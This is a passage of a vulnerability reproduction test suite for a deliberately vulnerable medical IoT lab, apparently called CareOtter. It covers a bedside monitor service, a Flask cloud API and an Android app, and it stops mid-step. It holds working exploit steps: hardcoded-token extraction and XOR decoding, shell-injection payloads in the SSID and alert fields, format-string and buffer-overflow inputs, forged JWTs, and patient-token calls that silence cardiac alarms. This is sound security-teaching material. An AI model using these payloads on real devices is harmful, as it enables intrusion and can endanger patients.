# CareOtter — Vulnerability Reproduction Test Suite

> **Version:** 1.0  
> **Date:** 2026-03-23  
> **Scope:** `labs/careotter/`, `cloud_api/careotter/`, `vulnzoo_apps/careotter_app/`  
> **Objective:** Verify that all vulnerabilities documented in `docs/CareOtter/` are reproducible in the laboratory environment.

---

## Table of Contents

1. [General Preconditions](#general-preconditions)
2. [Common Helpers](#common-helpers)
3. [Section A — CareService (IGP v4)](#section-a--careservice-igp-v4)
   - [IGP-01: Hardcoded Credential](#igp-01--hardcoded-credential-ottermobile2026)
   - [IGP-02: WiFi PSK Disclosure](#igp-02--information-disclosure-wifi-psk)
   - [IGP-03: TLV Integer Underflow → Stack BOF](#igp-03--integer-underflow--stack-bof)
   - [IGP-04: Format String (VERIFY_STATUS)](#igp-04--format-string-verify_status)
   - [IGP-05: Shell Injection (SET_WIFI)](#igp-05--shell-injection-set_wifi)
   - [IGP-06: Global Auth State Persistence](#igp-06--global-authentication-state-persistence)
   - [IGP-07: Format String in Therapy Log](#igp-07--format-string-in-therapy-log-defibrillate)
   - [IGP-08: Command Injection (EMERGENCY_ALERT)](#igp-08--command-injection-emergency_alert)
4. [Section B — Cloud API (Flask)](#section-b--cloud-api-flask)
   - [API-01: Weak JWT Secret](#api-01--weak-jwt-secret)
   - [API-02: WiFi PSK via REST](#api-02--wifi-psk-disclosure-via-rest)
   - [API-03: Format String Proxy](#api-03--format-string-proxy)
   - [API-04: Flask Debug Mode / RCE](#api-04--flask-debug-mode--werkzeug-rce)
   - [API-05: Weak Password Storage](#api-05--weak-password-storage-sha-256-no-salt)
   - [API-06: Partial Role Checks](#api-06--partial-role-checks)
5. [Section C — BLE / Mobile App](#section-c--ble--mobile-app)
6. [Section D — Medical Sensor HTTP](#section-d--medical-sensor-http)
   - [SENSOR-01: Hardcoded API Token](#sensor-01--hardcoded-api-token)
   - [SENSOR-02: Timing Side-Channel in Auth](#sensor-02--timing-side-channel-in-auth)
   - [SENSOR-03: Information Disclosure via Config](#sensor-03--information-disclosure-via-config)
   - [BLE-01: Missing BLE Pairing](#ble-01--missing-ble-pairing--bonding)
   - [BLE-02: Unencrypted BLE Channel](#ble-02--unencrypted-ble-channel)
   - [BLE-03: Plaintext External Storage Logging](#ble-03--plaintext-external-storage-logging)
   - [BLE-04: Hidden Diagnostic Panel](#ble-04--hidden-diagnostic-panel)
   - [BLE-05: Unvalidated GATT Writes](#ble-05--unvalidated-gatt-writes)
   - [BLE-06: CSCP v1 Hardcoded Key (M1)](#ble-06--cscp-v1-hardcoded-key-extraction-m1)
   - [BLE-07: CSCP v1 Threshold Forging (M3)](#ble-07--cscp-v1-threshold-forging-m3)
   - [BLE-08: Hidden Provisioning Service (P1)](#ble-08--hidden-provisioning-service-discovery-p1)
   - [BLE-09: Factory PIN Brute Force (P3)](#ble-09--factory-pin-brute-force-p3)
   - [BLE-10: WiFi PSK Extraction (P5)](#ble-10--wifi-psk-extraction-p5)
   - [BLE-11: Shell Injection via Provisioning (P4)](#ble-11--shell-injection-via-provisioning-p4)
   - [BLE-12: SSRF via Cloud URL (P6)](#ble-12--ssrf-via-cloud-url-redirection-p6)
   - [BLE-13: Unauthenticated Factory Reset (P7)](#ble-13--unauthenticated-factory-reset-p7)
   - [BLE-14: Channel Never Expires (P8)](#ble-14--provisioning-channel-never-expires-p8)
7. [Quick Validation Checklist](#quick-validation-checklist)
7. [Annexes](#annexes)
   - [A. IGP Helper Script](#a-igp-helper-script)
   - [B. CSCP Threshold Forger Script](#b-cscp-threshold-forger-script)

---

## General Preconditions

| Resource | Address / State |
|----------|-----------------|
| Raspberry Pi (OpenWRT) | `192.168.2.1` |
| CareService (IGP v4) | `192.168.2.1:9999` |
| Medical Sensor HTTP | `192.168.2.1:8081` |
| Cloud API (Flask) | `<operator-pc>:5002` (Docker) |
| Vulnerable mode | `VULNERABLE=1` (default) |
| BLE Peripheral | `CareOtter_HR` (advertising) |

**Required tools:** `curl`, `python3`, `netcat`/`nc`, `strings`, `jadx` (optional), BLE adapter + `bleak`/`pycryptodome` (for BLE tests).

---

## Common Helpers

### A. IGP Helper (Python)

Save as `igp_helper.py`:

```python
import socket
import struct
import sys

MAGIC = 0x43415245


def igp(cmd: int, payload: bytes = b'') -> bytes:
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection(('192.168.2.1', 9999), timeout=5) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)


if __name__ == '__main__':
    cmd = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x01
    payload = sys.argv[2].encode() if len(sys.argv) > 2 else b''
    print(igp(cmd, payload).decode('utf-8', errors='replace'))
```

Usage:
```bash
python3 igp_helper.py 0x02 "OtterMobile2026"
```

![[IGP_AUTH_SUCCESS.png]]

### B. Obtain Valid JWT (API)

```bash
# Admin
JWT=$(curl -s -X POST http://localhost:5002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"CareOtter2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Patient
JWT_PATIENT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username":"patient","password":"patient123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

---

## Section A — CareService (IGP v4)

### IGP-01 — Hardcoded Credential (`OtterMobile2026`)

**Documentation:** `CareOtter.md` Vuln #1  
**OWASP:** IoT I1 — Weak, Guessable, or Hardcoded Passwords  
**Type:** CWE-798 (Hardcoded Credentials)  
**Severity:** Critical
#### Why It Matters

The `careservice` daemon stores the administrator token as a literal string in its source code. When compiled, that string lands in the `.rodata` section of the ELF binary, visible to anyone who inspects the firmware. This turns the credential into a **universal master key**: a single token opens all CareOtter devices in the world, regardless of hospital, patient, or country. Unlike a user password, it cannot be changed from the clinical interface, rotated by IT, or revoked when a technician leaves the company. An attacker who possesses it can read the WiFi configuration, restart services, trigger simulated therapies, or inject shell commands, all without leaving an audit trail.
#### How an Attacker Obtains It

No sophisticated laboratory is needed. The token leaks through everyday channels:

- **Static firmware extraction.** With brief physical access — or with an image from the SD card removed from the monitor — it suffices to run `strings` on the binary to see `"OtterMobile2026"` in plaintext.
- **Reverse engineering of the Android app.** The patient application distributes the same token (obfuscated with XOR and a constant byte) inside its APK. Anyone can download it from the store, decompile it with open tools, and extract the credential in minutes, without ever touching the physical device.
- **Supply chain compromise.** The token lives in the manufacturer's Git repository. A compromised CI/CD pipeline, a disgruntled contractor, or an accidental source code leak exposes it before the first device leaves the factory.
- **Runtime memory dump.** If the attacker has already gained shell on the monitor through another vulnerability (for example, BLE or IGP command injection), they can read the running process memory with standard debuggers and find the token in RAM.
#### How It Should Be

A secure design completely eliminates the notion of a "universal factory password." Each monitor should derive its administrative credentials from a **unique hardware-bound secret** — stored in a TPM, Secure Element, or eFuses — combined with its own device identifier (MAC or serial number) via a key derivation function (KDF). The token would never travel over the network in plaintext; instead, the IGP v4 protocol should use **challenge-response** with the hardware secret, so that not even the legitimate administrator knows the underlying key. Sessions should expire after a period of inactivity (for example, fifteen minutes), and each authentication attempt should be logged with timestamp, source IP, and result.
#### Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Hardware | TPM / Secure Element / eFuses | Store the derivation secret in a non-exportable manner |
| Firmware | Derive token at runtime with HKDF | Prevent the final credential from appearing in the binary |
| Network | TLS 1.3 with per-device X.509 certificate | Encrypt the management channel and mutually authenticate |
| Authentication | HMAC-SHA256 challenge-response | Eliminate sending of static tokens over the network |
| Active protection | Rate limiting (5 attempts → 5 min lock) | Make brute-force infeasible |
| Auditing | Immutable log of every attempt and command | Detect unauthorized use and enable forensics |

#### Steps to Reproduce

```bash
# Method A: static extraction from binary
strings /opt/careservice/careservice | grep -i otter

# Method B: direct test via IGP
python3 igp_helper.py 0x02 "OtterMobile2026"

# Method C: incorrect token (negative control)
python3 igp_helper.py 0x02 "WrongToken123"
```

![[strings_careservice.png]]

![[IGP_AUTH_SUCCESS.png]]

#### Expected Result

- `strings` shows `OtterMobile2026` in plaintext.
- Correct token → `AUTH_SUCCESS`.
- Incorrect token → `AUTH_FAIL`.

#### Learning the IGP Protocol Without `igp_helper.py`

The helper script in [Common Helpers § A](#a-igp-helper-script) is a didactic convenience, not a prerequisite. A real attacker who has never seen this repository can reconstruct the 8-byte IGP v4 header (`[Magic(4)=0x43415245 "CARE" | Cmd(1) | Status(1)=0x00 | Len(2, big-endian)]`) from at least **four independent sources**, and from that point onwards any TCP client (`nc`, `socat`, `printf`, a 6-line Python snippet, even a Burp raw repeater) speaks the protocol. The goal of this section is to make IGP-01 reproducible **without depending on the annex helper**, so the test reflects the real adversary path.

##### Path A — Firmware reverse engineering (binary)

The most direct route when the attacker has, or can obtain, the binary (SD-card extraction, physical access, a leaked OTA, or chained shell from another vulnerability such as [BLE-11](#ble-11--shell-injection-via-provisioning-p4) or [IGP-05](#igp-05--shell-injection-set_wifi)):

```bash
# 1. Static strings — most literals jump out immediately
strings /opt/careservice/careservice | grep -Ei "otter|auth|magic|care|deauth|wifi"

# Expected output (excerpt):
#   OtterMobile2026
#   AUTH_SUCCESS
#   AUTH_FAIL
#   DEAUTH_OK
#   GET_NETWORK
#   DEFIBRILLATED
#   CARE                 ← the 4 magic bytes appear as ASCII in .rodata

# 2. Disassemble main() — radare2 / Ghidra / objdump
aarch64-linux-gnu-objdump -d /opt/careservice/careservice | less
#   Look for: read(fd, hdr, 8) → cmp against 0x43415245 → switch over byte at hdr+4
```

The `switch(cmd)` block makes the command set self-documenting: `0x01..0x0D` map one-to-one onto the cases the attacker will later test. The `ntohs()` call on the length field confirms big-endian.

##### Path B — Android APK reverse engineering (no device access required)

The patient application ships the protocol description and the **XOR-obfuscated** admin token in the DEX. Anyone who can install the APK can extract both without ever touching the monitor:

```bash
# 1. Pull the APK from a demo phone (or download from a public mirror)
adb shell pm path com.vulnzoo.careotter_app
adb pull /data/app/.../base.apk careotter_app.apk

# 2. Decompile — IMPORTANT: on Kali the `jadx` wrapper does `cd /usr/share/jadx/bin`
#    before exec, so a relative path resolves wrong. Always pass an absolute path:
jadx "$PWD/careotter_app.apk" -d "$PWD/out"

# 3. Recover the IGP header layout and opcode table (cleartext in IgpClient.java)
grep -rnE "IGP_MAGIC|0x43415245|9999|CMD_" out/sources/com/vulnzoo/

# Expected hits:
#   IgpClient.java: private static final int IGP_MAGIC = 1128354373;  // 0x43415245
#   IgpClient.java: // [Magic(4)=0x43415245 "CARE"] [Cmd(1)] [Status(1)=0x00] [Len(2)]
#   IgpClient.java: public static final byte CMD_AUTHENTICATE  = 0x02;
#   IgpClient.java: public static final byte CMD_DEAUTHENTICATE = 0x0D;
#   ...
# Note: jadx normalises int literals to decimal — `printf '%x\n' 1128354373` → 43415245
```

**The admin token is NOT a plaintext string in the APK.** A naive `strings careotter_app.apk | grep -i otter` returns nothing because the literal `"OtterMobile2026"` only exists at runtime, after the `decodeToken()` routine reverses a single-byte XOR. The on-disk artifact is a 15-byte array plus a decoder — the smoking gun an attacker actually looks for:

```bash
# Find the obfuscation primitive instead of the cleartext token
grep -rnE "ENCODED_TOKEN|decodeToken|0x5A|\^ 0x" out/sources/com/vulnzoo/

# Expected match (IgpClient.java — jadx renders byte literals as signed decimals;
# the hex values shown below are the equivalent unsigned representation):
#   // VULNERABILITY: admin token XOR-obfuscated with key 0x5A — trivially reversible
#   private static final byte[] ENCODED_TOKEN = {
#       0x15, 0x2E, 0x2E, 0x3F, 0x28, 0x17, 0x35, 0x38,
#       0x33, 0x36, 0x3F, 0x68, 0x6A, 0x68, 0x6C
#   };  // ↳ jadx output: {21, 46, 46, 63, 40, 23, 53, 56, 51, 54, 63, 104, 106, 104, 108}
#   public static String decodeToken() {
#       for (int i = 0; i < ENCODED_TOKEN.length; i++)
#           result[i] = (byte) (ENCODED_TOKEN[i] ^ 0x5A);
#       ...
#   }
```

Three ways to recover the cleartext token from that array:

```bash
# Option 1 — Replay the decoder (key already known from source)
python3 -c '
enc = [0x15,0x2E,0x2E,0x3F,0x28,0x17,0x35,0x38,0x33,0x36,0x3F,0x68,0x6A,0x68,0x6C]
print(bytes(b ^ 0x5A for b in enc).decode())'
# → OtterMobile2026

# Option 2 — Single-byte XOR brute force (no need to read decodeToken())
python3 -c '
enc = bytes([0x15,0x2E,0x2E,0x3F,0x28,0x17,0x35,0x38,0x33,0x36,0x3F,0x68,0x6A,0x68,0x6C])
for k in range(256):
    out = bytes(b ^ k for b in enc)
    if all(32 <= c < 127 for c in out): print(f"key=0x{k:02x}: {out.decode()}")'
# → key=0x5a: OtterMobile2026     (the only lexically plausible candidate)

# Option 3 — Runtime hook with Frida on the live app (no static analysis at all)
frida -U -n com.vulnzoo.careotter_app -e '
Java.perform(() => {
  const C = Java.use("com.vulnzoo.careotter_app.IgpClient");
  C.decodeToken.implementation = function () {
    const r = this.decodeToken();
    console.log("TOKEN=" + r);
    return r;
  };
});'
# → TOKEN=OtterMobile2026 the next time the app authenticates
```

After this step the attacker has the full IGP header layout, the opcode table, **and** the decoded token — exactly what `igp_helper.py` would have provided, without ever opening it. The obfuscation does not raise the bar: it is a single-byte XOR with the key hardcoded next to the ciphertext, which CWE-656 ("Reliance on Security Through Obscurity") explicitly calls out as ineffective.

**End-to-end validation against the live device** (closes the loop — APK reverse → live `AUTH_SUCCESS`):

```bash
# Send IGP 0x02 AUTHENTICATE using the token recovered above.
# Frame: magic="CARE"(43 41 52 45) cmd=02 status=00 len=000F payload="OtterMobile2026"
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026' | nc -w 3 192.168.2.1 9999 | xxd
# Expected:
#   00000000: 4155 5448 5f53 5543 4345 5353            AUTH_SUCCESS
```

If you see `AUTH_FAIL` instead, the most common cause is that the APK shipped with a desynchronised `ENCODED_TOKEN` array (the XOR ciphertext does not decode to `"OtterMobile2026"`). Rebuild and reinstall the APK from `vulnzoo_apps/careotter_app/` before retrying:

```bash
cd vulnzoo_apps/careotter_app && ./gradlew assembleDebug
adb uninstall com.vulnzoo.careotter_app
adb install app/build/outputs/apk/debug/app-debug.apk
```

##### Path C — Passive network capture (no reversing at all)

The IGP channel is plaintext TCP. An attacker on the same broadcast domain — or after a trivial ARP-spoof on the `192.168.2.0/24` segment — sniffs a single legitimate admin login and infers the entire wire format from one packet:

```bash
# On the attacker's host on the lab segment
sudo tcpdump -i any -w careotter.pcap 'tcp port 9999'

# Open in Wireshark, filter `tcp.port == 9999`, follow TCP stream.
# A login packet looks like:
#   43 41 52 45  02  00  00 0F   4F 74 74 65 72 4D 6F 62 69 6C 65 32 30 32 36
#   └─ "CARE" ─┘ cmd  st  len     └────────── "OtterMobile2026" ─────────────┘
```

Magic, opcode, status, big-endian length and the token are recovered from **one packet**. Replay is immediate via `nc` (see "Manual exploitation" below). This is the same path that makes [IGP-06](#igp-06--global-authentication-state-persistence) trivially exploitable across captured sessions.

##### Path D — Cloud API leak

The Flask Cloud API on `:5002` proxies a subset of IGP commands. Triggering verbose error paths (oversized parameters, debug tracebacks via [API-04](#api-04--flask-debug-mode--werkzeug-rce), or the format-string path in [API-03](#api-03--format-string-proxy)) frequently echoes raw IGP frames or careservice stack frames into the HTTP response — enough to confirm magic and opcode mapping without ever opening a TCP socket to port 9999.

##### Manual exploitation — three "no-helper" idioms

Once the header is known, IGP-01 can be reproduced with any of the following, **without saving `igp_helper.py`**:

```bash
# 1) Pure shell with printf + nc — no Python at all
#    magic=CARE  cmd=0x02  status=0x00  len=0x000F  payload="OtterMobile2026"
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026' | nc 192.168.2.1 9999
# → AUTH_SUCCESS

# 2) Python one-liner — what the attacker writes after reading IgpClient.java
python3 -c '
import socket, struct
s = socket.create_connection(("192.168.2.1", 9999))
p = b"OtterMobile2026"
s.sendall(struct.pack(">IBBH", 0x43415245, 2, 0, len(p)) + p)
print(s.recv(1024))'
# → b"AUTH_SUCCESS"

# 3) Negative control with a wrong token
printf '\x43\x41\x52\x45\x02\x00\x00\x0cWrongToken12'  | nc 192.168.2.1 9999
# → AUTH_FAIL
```

##### Chaining notes

After a single successful `AUTH_SUCCESS` obtained by any of the paths above, **every subsequent TCP connection inherits the privilege** because of the global `authenticated` flag — see [IGP-06](#igp-06--global-authentication-state-persistence) and the I7.2 "Authentication State Race Condition" entry in [`CareOtter_IoT.md`](IoT/CareOtter_IoT.md). From that single login, the attacker can chain — without re-authenticating — into [IGP-02](#igp-02--information-disclosure-wifi-psk) (WiFi PSK leak), [IGP-03](#igp-03--integer-underflow--stack-bof-tlv-parser) (stack BOF), [IGP-04](#igp-04--format-string-verify_status) (format-string read), [IGP-05](#igp-05--shell-injection-set_wifi) (shell injection), [IGP-07](#igp-07--format-string-in-therapy-log-defibrillate) and [IGP-08](#igp-08--command-injection-emergency_alert). The recommended deauthenticate command (`0x0D`) closes the window but is *advisory*: a malicious client will simply never send it.

##### What this means for the test

When validating IGP-01 in the lab, run **at least two of the four paths above** before falling back to `igp_helper.py`. The vulnerability is not "the helper exists"; it is that **four orthogonal sources** (firmware, APK, network capture, Cloud API error oracle) each independently disclose magic + opcode set + universal token, and that the wire protocol carries no cryptographic protection that could neutralise any one of them.

---

### IGP-02 — Information Disclosure (WiFi PSK)

**Documentation:** `CareOtter.md` Vuln #2  
**OWASP:** IoT I6 — Insufficient Privacy Protection
**Type:** CWE-200 (Information Exposure)  
**Severity:** High

#### Steps to Reproduce

```bash
# 1. Authenticate
python3 igp_helper.py 0x02 "OtterMobile2026"

# 2. Request network configuration (requires prior auth)
python3 igp_helper.py 0x03
```

#### Expected Result

The response contains the full contents of `/etc/config/wireless`, including `option key 'MiClaveWiFi'` in plaintext.

---

### IGP-03 — Integer Underflow → Stack BOF (TLV Parser)

**Documentation:** `CareOtter.md` Vuln #3  
**OWASP:** IoT I9 — Insecure Default Settings
**Type:** CWE-191 → CWE-121  
**Severity:** Critical

#### Steps to Reproduce

```bash
# Authenticate first
python3 igp_helper.py 0x02 "OtterMobile2026"

# Send malicious TLV: Type=0xAA, Len=0xFF, only 2 real bytes
python3 -c "
import socket, struct
MAGIC = 0x43415245
payload = b'\xAA\xFF\x41\x41'
hdr = struct.pack('>IBBH', MAGIC, 0x04, 0, len(payload))
with socket.create_connection(('192.168.2.1', 9999)) as s:
    s.sendall(hdr + payload)
    print(s.recv(4096))
"
```

#### Expected Result

The service may crash (segfault) or exhibit anomalous behavior because `remaining` underflows and `memcpy` writes outside of `local_store[128]`.

---

### IGP-04 — Format String (VERIFY_STATUS)

**Documentation:** `CareOtter.md` Vuln #4  
**OWASP:** IoT I9 — Insecure Default Settings
**Type:** CWE-134  
**Severity:** High

#### Steps to Reproduce

```bash
# Does not require authentication
python3 igp_helper.py 0x05 '%x.%x.%x'
```

#### Expected Result

The response contains hexadecimal values from the process stack (e.g. `bffff3a0.8048c23.1`). With `%n` memory write can be demonstrated.

---

### IGP-05 — Shell Injection (SET_WIFI)

**Documentation:** `CareOtter.md` Vuln #5  
**OWASP:** IoT I9 — Insecure Default Settings
**Type:** CWE-78 (OS Command Injection)  
**Severity:** Critical

#### Steps to Reproduce

```bash
# 1. Authenticate
python3 igp_helper.py 0x02 "OtterMobile2026"

# 2. Inject command via SSID
python3 igp_helper.py 0x06 "'; touch /tmp/igp_wifi_pwned #|fakepass123"
```

#### Expected Result

The file `/tmp/igp_wifi_pwned` is created on the Raspberry Pi, demonstrating direct interpolation into `system()` without sanitization.

---

### IGP-06 — Global Authentication State Persistence

**Documentation:** `CareOtter.md` Vuln #6  
**OWASP:** IoT I7 — Insecure Data Transfer and Storage
**Type:** CWE-613 (Insufficient Session Expiration)  
**Severity:** High

#### Steps to Reproduce

```bash
# Connection A: authenticate
python3 igp_helper.py 0x02 "OtterMobile2026"

# Connection B: WITHOUT authenticating, request protected command directly
python3 igp_helper.py 0x03
```

#### Expected Result

The second connection (completely new TCP) receives the WiFi configuration without ever having sent the token, demonstrating that `authenticated` is a persistent global variable in the `careservice` process.

---

### IGP-07 — Format String in Therapy Log (DEFIBRILLATE)

**Documentation:** `CareOtter.md` Vuln #11  
**OWASP:** IoT I9 — Insecure Default Settings
**Type:** CWE-134  
**Severity:** High

#### Steps to Reproduce

```bash
# 1. Authenticate
python3 igp_helper.py 0x02 "OtterMobile2026"

# 2. Trigger DEFIBRILLATE with format string
python3 igp_helper.py 0x0B '%x.%x.%x'
```

#### Expected Result

The response shows `DEFIBRILLATED:200J:<timestamp>`, but additionally `/opt/careotter_events.log` contains leaked stack values from the second vulnerable `snprintf` that uses the payload as format.

---

### IGP-08 — Command Injection (EMERGENCY_ALERT)

**Documentation:** `CareOtter.md` Vuln #12  
**OWASP:** IoT I9 — Insecure Default Settings
**Type:** CWE-78  
**Severity:** Critical

#### Steps to Reproduce

```bash
# 1. Authenticate
python3 igp_helper.py 0x02 "OtterMobile2026"

# 2. Inject command via curl msg parameter
python3 igp_helper.py 0x0C "test'; touch /tmp/alert_pwned #"
```

#### Expected Result

The file `/tmp/alert_pwned` is created on the device, demonstrating that the payload was concatenated without escaping into the `curl -d 'msg=...'` command executed via `system()`.

---

## Section B — Cloud API (Flask)

### API-01 — Weak JWT Secret

**Documentation:** `CareOtter.md` Vuln #7 / `CareOtter_API.md` Critical #1  
**OWASP:** API2 — Broken Authentication
**Type:** CWE-798  
**Severity:** Critical

#### Steps to Reproduce

```bash
# Extract secret from source code
grep -r "JWT_SECRET" cloud_api/careotter/api_server/config.py

# Generate valid JWT with known secret
python3 -c "
import jwt, time
token = jwt.encode(
    {'username': 'admin', 'role': 'admin', 'exp': time.time() + 3600},
    'careotter_jwt_2026',
    algorithm='HS256'
)
print(token)
"

# Use forged token against protected endpoint
curl -H "Authorization: Bearer <FORGED_TOKEN>" \
     http://localhost:5002/api/network
```

#### Expected Result

The API accepts the forged token and returns the network configuration.

---

### API-02 — WiFi PSK Disclosure via REST

**Documentation:** `CareOtter.md` Vuln #8  
**OWASP:** API1 — Broken Object Level Authorization
**Type:** CWE-200  
**Severity:** High

#### Steps to Reproduce

```bash
# 1. Obtain valid JWT
JWT=$(curl -s -X POST http://localhost:5002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"CareOtter2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. Request network (VULNERABLE=1 only)
curl -s -H "Authorization: Bearer $JWT" \
     http://localhost:5002/api/network | python3 -m json.tool
```

#### Expected Result

The `raw` field contains the WiFi PSK in plaintext. In `VULNERABLE=0` this field is omitted (control test).

---

### API-03 — Format String Proxy

**Documentation:** `CareOtter.md` Vuln #9  
**OWASP:** API10 — Unsafe Consumption of APIs
**Type:** CWE-134  
**Severity:** High

#### Steps to Reproduce

```bash
JWT=$(curl -s -X POST http://localhost:5002/api/auth/login \
  -d '{"username":"admin","password":"CareOtter2026!"}' \
  -H "Content-Type: application/json" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -s -H "Authorization: Bearer $JWT" \
     "http://localhost:5002/api/device/status?module=%25x.%25x.%25x"
```

#### Expected Result

In `VULNERABLE=1` mode, the response contains values from the `careservice` process stack. In `VULNERABLE=0` the module is forced to `CareOtter`.

---

### API-04 — Flask Debug Mode / Werkzeug RCE

**Documentation:** `CareOtter.md` Vuln #10  
**OWASP:** API8 — Security Misconfiguration
**Type:** CWE-489  
**Severity:** Critical

#### Steps to Reproduce

```bash
# Verify debug is active
curl -s http://localhost:5002/api/nonexistent | grep -i "debugger\|traceback"

# Attempt to access interactive console
curl -s http://localhost:5002/console | head
```

#### Expected Result

The Werkzeug HTML traceback with the interactive console button is observed. If the PIN is obtained (via log reading or Werkzeug RNG attack), RCE is achieved.

---

### API-05 — Weak Password Storage (SHA-256, no salt)

**Documentation:** `CareOtter_API.md` Vulnerability Surface #4  
**OWASP:** API2 — Broken Authentication
**Type:** CWE-916  
**Severity:** Medium

#### Steps to Reproduce

```bash
# Calculate SHA-256 hash of default password
echo -n 'CareOtter2026!' | sha256sum

# Compare with stored value in SQLite
sqlite3 /app/data/careotter.db \
  "SELECT username, password_hash FROM users WHERE username='admin';"
```

#### Expected Result

The stored `password_hash` is identical to the `sha256sum` output, without salt or iterations.

---

### API-06 — Broken Function Level Authorization (BFLA)

**Documentation:** `CareOtter_API.md` Vulnerability Surface #8  
**OWASP:** API5 — Broken Function Level Authorization
**Type:** CWE-863 (Incorrect Authorization)  
**Severity:** High

#### Why It Matters

Authentication answers the question *"Who are you?"* Authorization answers *"What are you allowed to do?"* CareOtter conflates the two. Once the Cloud API verifies that a JWT is cryptographically valid (correct signature, not expired), it assumes the bearer is authorized to invoke **any** protected REST endpoint. The `role` claim inside the token (`admin` vs `patient`) is never inspected for API routes, even though the same application enforces role separation perfectly in its HTML routes.

This is a classic **Broken Function Level Authorization (BFLA)** vulnerability: a low-privilege user (patient) can exercise high-privilege functions (administrative device management) with nothing more than their own legitimate credentials.

The impact is severe because the affected endpoints are not merely "informational." They include WiFi reconfiguration (which is vulnerable to shell injection via IGP 0x06), clinical threshold modification, service restart, and raw log exfiltration. A patient who simply wants to view their own vitals can, accidentally or maliciously, obtain the hospital WiFi PSK, silence all cardiac alarms, or obtain a remote root shell on the bedside monitor.

#### Root Cause Analysis

The defect is architectural: the REST API and the Web UI use two completely different authorization decorators.

**1. REST API decorator (`core/decorators.py`, lines 31–65)**

```python
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization', '')
        if not auth_header.startswith('Bearer '):
            return jsonify({'error': 'Token required', 'code': 'MISSING_TOKEN'}), 401

        token = auth_header.split(' ', 1)[1].strip()
        result = JWTService.decode_token(token)

        if not result['success']:
            return jsonify({
                'error': result['error'],
                'code': 'INVALID_TOKEN'
            }), 401

        # MISSING: no inspection of result['payload']['role']
        return f(*args, **kwargs)
    return decorated
```

`@token_required` performs **authentication only**. It validates the JWT signature and expiration, then immediately calls the handler. It never reads the `role` claim from the decoded payload.

**2. Web UI decorator (`core/decorators.py`, lines 79–87)**

```python
def web_admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        payload = _decode_and_validate()
        if not payload or payload.get('role') != 'admin':
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated
```

`@web_admin_required` performs **both authentication and authorization**. It extracts the payload and explicitly checks `role == 'admin'`. The HTML routes (`/admin/dashboard`, `/admin/network`, etc.) are therefore properly protected.

**3. The gap**

Every administrative REST endpoint in `app.py` uses `@token_required`, not `@web_admin_required`:

- `GET /api/network`
- `POST /api/network/wifi`
- `POST /api/config/preferences`
- `POST /api/config/thresholds`
- `POST /api/services/restart`
- `GET /api/logs`
- `GET /api/devices`
- `POST /api/devices`

Because the REST layer lacks role enforcement, any user who can obtain a valid JWT — including a patient — can invoke all of these endpoints.

**4. Coincidental "protection" (not real authorization)**

Two endpoints appear safe because they happen to query by username extracted from the token:

- `GET /api/user/devices` — calls `db.get_devices_for_patient(username)` where `username` comes from the JWT `sub` claim. A patient only sees their own devices, but this is a query-side effect, not an authorization gate.
- `GET /api/devices/me` — calls `db.get_device_by_patient(username)` with the same pattern.

If an attacker forges a JWT with `sub='admin'` (possible because of API-01 Weak JWT Secret), even these endpoints would leak cross-patient data.

#### Affected Endpoints

| Method | Endpoint                  | Admin Function                | Impact When Accessed by Patient                                       |
| ------ | ------------------------- | ----------------------------- | --------------------------------------------------------------------- |
| `GET`  | `/api/network`            | Read WiFi configuration       | **CWE-200** — PSK leaked in plaintext (`raw` field)                   |
| `POST` | `/api/network/wifi`       | Change WiFi via IGP 0x06      | **CWE-78** — Shell injection payload via SSID field → RCE on Pi       |
| `POST` | `/api/config/preferences` | Write TLV preferences         | **CWE-681** — Integer underflow in TLV parsing → potential stack BOF  |
| `POST` | `/api/config/thresholds`  | Set clinical alert thresholds | **Patient safety** — BPM/spO2 alarms silenced (bpm_min=0, spo2_min=0) |
| `POST` | `/api/services/restart`   | Restart init.d services       | **DoS** — Medical sensor or BLE server stopped                        |
| `GET`  | `/api/logs`               | Read device admin log         | **CWE-200** — Internal firmware events and paths exposed              |
| `GET`  | `/api/devices`            | List all registered devices   | **Privacy** — Other patients' MAC addresses and associations exposed  |
| `POST` | `/api/devices`            | Register new device           | **Integrity** — Rogue device MACs linked to arbitrary patients        |

#### Steps to Reproduce

**Precondition:** The system must be initialized (users exist). If the database is empty, run:

```bash
curl http://localhost:5002/initialize_iot
```

**Step 1 — Obtain a valid patient JWT**

```bash
JWT_PATIENT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username":"patient","password":"patient123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "$JWT_PATIENT"
```

**Step 2 — Inspect the token payload to confirm `role: patient`**

```bash
# JWT part 2 is the Base64-encoded payload
echo -n "$JWT_PATIENT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

Expected output:
```json
{
  "username": "patient",
  "role": "patient",
  "exp": 1750000000,
  "iat": 1749996400
}
```

The bearer is explicitly a **patient**, not an administrator.

**Step 3 — Access admin endpoints with the patient token**

*3A. WiFi PSK disclosure (information disclosure + BFLA):*

```bash
curl -s -H "Authorization: Bearer $JWT_PATIENT" \
  http://localhost:5002/api/network | python3 -m json.tool
```

*3B. Modify clinical thresholds (patient safety compromise):*

```bash
curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
  -H "Content-Type: application/json" \
  -d '{"bpm_min":0,"bpm_max":255,"spo2_min":0}' \
  http://localhost:5002/api/config/thresholds
```

*3C. Restart the medical sensor service (denial of clinical monitoring):*

```bash
